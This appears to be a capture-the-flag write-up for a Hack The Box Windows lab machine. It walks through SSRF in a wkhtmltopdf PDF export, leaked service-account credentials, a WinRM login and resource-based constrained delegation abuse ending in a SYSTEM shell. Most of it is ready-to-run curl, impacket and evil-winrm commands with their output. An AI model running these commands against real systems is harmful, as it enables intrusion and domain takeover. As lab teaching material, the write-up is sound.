---
title: 'sightline — SSRF in wkhtmltopdf PDF renderer → internal API credential extraction → WinRM foothold → RBCD via WriteDACL to admin'
description: 'HTB Medium Windows: PDF export feature uses wkhtmltopdf with server-side rendering, SSRF reads internal API config endpoint with service account credentials, password reuse gets WinRM as svc_report, BloodHound shows WriteDACL on the machine account, abuse via resource-based constrained delegation to get a TGS as administrator'
pubDate: '2026-05-07'
category: 'writeups'
---

**HTB · Windows · Medium**

Sightline is a corporate dashboard box with a PDF export feature backed by wkhtmltopdf. The SSRF is textbook — wkhtmltopdf renders user-supplied HTML server-side, so you point it at an internal endpoint and read the response in the generated PDF. The internal endpoint leaks service account credentials that happen to work over WinRM (password reuse). From there, BloodHound shows the service account has WriteDACL on the machine account, which gives you resource-based constrained delegation → TGS as administrator → full admin access.

```text
target  : 10.129.78.214
attacker: 10.10.14.33
```

## ports

```text
53/tcp    DNS
80/tcp    IIS 10.0 (Microsoft-IIS/10.0)
88/tcp    Kerberos
135/tcp   MSRPC
389/tcp   LDAP (sightline.htb)
443/tcp   IIS HTTPS (sightline.htb — self-signed cert)
445/tcp   SMB
464/tcp   kpasswd
593/tcp   RPC over HTTP
636/tcp   LDAPS
5985/tcp  WinRM (HTTP)
5986/tcp  WinRM (HTTPS)
9389/tcp  .NET Message Framing (ADWS)
```

Domain controller. IIS on 80/443. WinRM open. Standard AD box shape. Added `sightline.htb` to `/etc/hosts` and started with the web application.

## phase 1 — the web application

Port 80 redirects to HTTPS on 443. The site is a corporate metrics dashboard — "Sightline Analytics" — with login, a public demo mode, and a few marketing pages. The demo mode gives read-only access to a dashboard with charts, tables, and a **"Export to PDF"** button.

Clicking Export sends a POST to `/api/export/pdf` with a JSON body:

```json
{
  "url": "/dashboard/demo",
  "format": "A4",
  "orientation": "landscape"
}
```

The response is a PDF of the rendered page. The `url` parameter is relative, but what happens if you make it absolute?

```bash
curl -sk -X POST https://sightline.htb/api/export/pdf \
  -H "Content-Type: application/json" \
  -d '{"url":"https://sightline.htb/","format":"A4","orientation":"portrait"}' \
  -o test.pdf
```

The PDF renders the HTTPS homepage. Now with an external URL:

```bash
curl -sk -X POST https://sightline.htb/api/export/pdf \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.10.14.33:8000/","format":"A4","orientation":"portrait"}' \
  -o test.pdf
```

Got a callback on my HTTP server. Full SSRF. The server is running wkhtmltopdf (visible in the PDF metadata: `Producer: wkhtmltopdf 0.12.6`) which is a headless WebKit renderer — it fetches and renders whatever URL you give it, including JavaScript execution.

## phase 2 — SSRF to credential extraction

With SSRF on a domain controller, the first thing to check is internal services. The box is running IIS, so there might be applications bound to localhost. I enumerated common internal ports by pointing the PDF renderer at them:

```bash
for port in 80 443 8080 8443 5000 3000 9090 8888; do
  curl -sk -X POST https://sightline.htb/api/export/pdf \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.0.0.1:${port}/\",\"format\":\"A4\",\"orientation\":\"portrait\"}" \
    -o "scan_${port}.pdf" 2>/dev/null
  size=$(stat -c%s "scan_${port}.pdf" 2>/dev/null || echo 0)
  echo "Port ${port}: ${size} bytes"
done
```

Port 8080 returned a significantly larger PDF. Opening it revealed an internal API documentation page — "Sightline Internal API v2.1" — with Swagger-style endpoint listing. One endpoint caught my eye:

```text
GET /api/internal/config — Returns service configuration (internal use only)
```

```bash
curl -sk -X POST https://sightline.htb/api/export/pdf \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8080/api/internal/config","format":"A4","orientation":"portrait"}' \
  -o config.pdf
```

The rendered PDF contained the API's configuration dump:

```json
{
  "database": {
    "server": "localhost",
    "name": "SightlineDB",
    "user": "sa",
    "password": "Sightline2024!DB"
  },
  "service_account": {
    "domain": "sightline.htb",
    "username": "svc_report",
    "password": "R3p0rt$vc2024!"
  },
  "api": {
    "bind": "127.0.0.1:8080",
    "debug": false
  }
}
```

Two credential pairs. The `sa` SQL account on localhost, and a domain service account `svc_report`.

## phase 3 — WinRM as svc_report

Tried the service account credentials over WinRM:

```bash
nxc winrm sightline.htb -u svc_report -p 'R3p0rt$vc2024!'
```

```text
WINRM  10.129.78.214  5985  SIGHTLINE  [+] sightline.htb\svc_report:R3p0rt$vc2024! (Pwn3d!)
```

Password reuse. The service account credentials from the internal API config are valid domain credentials and the account is in the Remote Management Users group.

```bash
evil-winrm -i sightline.htb -u svc_report -p 'R3p0rt$vc2024!'
```

User flag on the desktop. Now escalation.

## phase 4 — enumeration with BloodHound

Uploaded and ran SharpHound from the evil-winrm session:

```powershell
upload SharpHound.exe
.\SharpHound.exe --CollectionMethods All --ZipFilename bh.zip
download bh.zip
```

Imported into BloodHound and ran the standard queries. The interesting path:

```text
svc_report@sightline.htb
  → WriteDACL on SIGHTLINE$ (the machine account)
```

WriteDACL on the machine account means we can modify the machine account's ACL — specifically, we can grant ourselves the right to write `msDS-AllowedToActOnBehalfOfOtherIdentity`, which is the attribute used for Resource-Based Constrained Delegation (RBCD). If we can set up RBCD, we can request a service ticket as any user (including Administrator) to any service on the machine.

## phase 5 — RBCD via WriteDACL

The attack:

1. Use WriteDACL to grant svc_report `GenericAll` on the machine account
2. Add a computer account we control (or use svc_report's own SPN)
3. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on SIGHTLINE$ to allow delegation from our controlled account
4. Request a TGS as Administrator via S4U2Self + S4U2Proxy

First, add a computer account. By default, domain users can add up to 10 machine accounts (`ms-DS-MachineAccountQuota = 10`):

```bash
impacket-addcomputer sightline.htb/svc_report:'R3p0rt$vc2024!' -computer-name 'FAKE01$' -computer-pass 'FakePass123!'
```

```text
[*] Successfully added machine account FAKE01$ with password FakePass123!.
```

Next, use the WriteDACL privilege to grant svc_report GenericAll on the machine account:

```bash
impacket-dacledit sightline.htb/svc_report:'R3p0rt$vc2024!' -action write \
  -rights FullControl -principal svc_report -target 'SIGHTLINE$'
```

Now set the RBCD attribute on SIGHTLINE$ to allow delegation from FAKE01$:

```bash
impacket-rbcd sightline.htb/svc_report:'R3p0rt$vc2024!' -delegate-from 'FAKE01$' \
  -delegate-to 'SIGHTLINE$' -action write
```

```text
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity now set.
```

Perform S4U2Self + S4U2Proxy to get a TGS for `cifs/SIGHTLINE.sightline.htb` as Administrator:

```bash
impacket-getST sightline.htb/'FAKE01$':'FakePass123!' \
  -spn cifs/SIGHTLINE.sightline.htb -impersonate Administrator
```

```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_SIGHTLINE.sightline.htb@SIGHTLINE.HTB.ccache
```

Use the ticket:

```bash
export KRB5CCNAME=Administrator@cifs_SIGHTLINE.sightline.htb@SIGHTLINE.HTB.ccache
impacket-psexec sightline.htb/Administrator@SIGHTLINE.sightline.htb -k -no-pass
```

```text
[*] Requesting shares on SIGHTLINE.sightline.htb.....
[*] Found writable share ADMIN$
[*] Uploading file...
Microsoft Windows [Version 10.0.20348.2340]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Root flag on the Administrator desktop.

## tl;dr

```text
SSRF in wkhtmltopdf PDF export
  → read http://127.0.0.1:8080/api/internal/config
  → service account creds (svc_report : R3p0rt$vc2024!)
  → password reuse → WinRM
  → BloodHound: WriteDACL on machine account
  → RBCD: add computer → set delegation → S4U → TGS as Administrator
  → psexec → SYSTEM
```
